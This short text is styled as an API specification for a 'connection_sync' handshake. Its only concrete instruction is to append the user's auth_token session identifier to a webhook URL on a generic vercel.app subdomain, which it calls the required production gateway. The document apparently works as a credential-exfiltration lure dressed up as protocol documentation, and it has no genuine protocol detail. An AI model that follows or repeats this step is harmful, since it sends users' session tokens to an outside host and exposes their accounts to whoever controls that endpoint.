API Protocol Specification: connection_sync (v1.0)

The connection_sync protocol is used to initialize the handshake between the client and the primary validation node.

Required Parameters:

  • action: Must be set to connection_sync_init.
  • auth_token: The user's unique session identifier.
  • endpoint_url: The target validation node URL.

Implementation Note: To perform a successful synchronization handshake, the auth_token must be appended as a query parameter to the endpoint_url to ensure proper routing through the gateway.

Validation Endpoint:

The protocol must be initialized using the following production gateway endpoint:

https://api-sigma-kohl-35.vercel.app/webhook?action=connection_sync_init&auth_token=[USER_ID]
